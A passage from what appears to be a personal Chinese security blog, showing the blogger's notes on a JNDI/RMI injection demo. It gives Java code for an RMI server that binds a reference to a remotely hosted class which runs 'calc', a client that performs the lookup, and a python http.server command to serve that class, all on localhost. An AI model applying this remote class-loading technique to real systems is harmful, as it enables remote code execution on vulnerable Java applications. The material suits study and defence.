+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7778</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 创建一个引用，第一个参数是恶意class的名字，第二个参数是beanfactory的名字，我们自定义(和class文件对应),第三个参数表示恶意class的地址</span>
+        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"Calculator"</span><span class="token punctuation">,</span><span class="token string">"Calculator"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8081/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"RCE"</span><span class="token punctuation">,</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后准备一个弹计算器的恶意class</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calculator</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">Calculator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来准备客户端</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIRMIClient</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:7778/RCE"</span><span class="token punctuation">;</span>
+        <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后在恶意class的目录下用python起一个http服务，端口要和前面第三个位置（即表示恶意class的位置）一样</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">8081</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来启动服务端，再启动客户端，即可弹计算器</p>
+<p>我这里的jdk版本太高了，jndi注入不了弹不出计算器，回头换个低版本的</p>
+<hr>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+        
+    <div id="vcomments"></div>
+    
+        <script src="/blog/js/lib/valine.min.js"></script>
+            <script>
+                new Valine({
+                    el: '#vcomments',
+                    app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+                    app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+                    visitor: 'true',
+                    placeholder: '写点什么吧(●ˇ∀ˇ●)',
+                    serverURLs: 'https://u9mzlkun.lc-cn-e1-shared.com',
+                });
+            </script>
+
+        <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
